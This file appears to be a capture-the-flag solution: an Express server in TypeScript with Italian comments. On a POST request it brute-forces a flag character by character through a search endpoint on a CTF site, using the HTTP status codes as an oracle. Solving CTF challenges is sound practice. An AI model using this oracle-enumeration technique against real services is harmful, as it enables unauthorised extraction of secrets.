import express from "express";
import axios from "axios";

const app = express();
const PORT = 3000;

const charset =
	"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!_";
let flag = "flag{";
let index = 0;

const checkCharacter = async (character: string): Promise<boolean> => {
	try {
		const response = await axios.get(
			`https://matrix.capturetheflags.site/search?s=${flag + character}`
		);
		return response.status === 200;
	} catch (error) {
		if (axios.isAxiosError(error) && error.response) {
			return error.response.status === 404;
		}
		console.error("Errore inaspettato:", error);
		return false;
	}
};

const testNextCharacter = async (): Promise<void> => {
	if (flag.endsWith("}")) {
		console.log(`Flag completa trovata: ${flag}`);
		return;
	}

	// Se abbiamo una stringa completa senza errori, possiamo aggiungere il carattere di chiusura
	if (flag.length > 5 && (await checkCharacter("}"))) {
		flag += "}";
		console.log(`Flag completa trovata: ${flag}`);
		return;
	}

	const character = charset[index];

	if (!character) {
		console.log("Errore: Nessun carattere trovato!");
		return;
	}

	const isCorrect = await checkCharacter(character);

	if (isCorrect) {
		flag += character;
		index = 0; // Reset dell'indice per il prossimo carattere
		console.log(
			`Carattere corretto trovato: ${character} - Flag parziale: ${flag}`
		);
	} else {
		index++; // Passa al prossimo carattere
	}

	testNextCharacter();
};

app.get("/", (req, res) => {
	console.log("🛒 GET: This request was made by the Architect 🧑‍💼!");
	res.send("Hello Architect!");
});

app.post("/", (req, res) => {
	console.log("⬆️ POST: Questa richiesta è stata fatta dall'Architetto 🧑‍💼!");

	// Avvia la ricerca della flag quando l'architetto fa una richiesta POST
	testNextCharacter();

	res.sendStatus(200);
});

app.listen(PORT, () => {
	console.log(`Server in esecuzione su http://localhost:${PORT}`);
});
